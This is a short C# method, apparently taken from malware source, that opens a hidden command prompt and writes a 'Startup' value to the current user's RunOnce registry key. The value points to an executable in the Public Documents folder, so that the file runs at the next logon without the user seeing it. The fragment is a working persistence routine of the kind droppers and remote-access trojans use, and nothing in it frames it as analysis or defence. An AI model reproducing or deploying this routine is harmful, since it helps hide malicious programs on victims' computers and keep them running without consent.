private static void RunOnce(string Filename)
        {
            string publicDir = Environment.GetEnvironmentVariable("public");
            System.Diagnostics.ProcessStartInfo pro = new System.Diagnostics.ProcessStartInfo();
            System.Diagnostics.Process pri = new System.Diagnostics.Process();
            pro.FileName = "cmd.exe";
            pro.CreateNoWindow = true;
            pro.UseShellExecute = false;
            pro.RedirectStandardInput = true;
            pro.RedirectStandardOutput = false;
            pro.RedirectStandardError = false;
            pri.StartInfo = pro;
            pri.Start();
            pri.StandardInput.Write("reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"" + "Startup" + "\" /t REG_SZ /d " + publicDir + @"\Documents\" + Filename + ".exe" + " /f");
            Thread.Sleep(3000);
            pri.StandardInput.Write(Environment.NewLine);
            pri.StandardInput.Close();
            pri.WaitForExit();
            pri.Close();
        }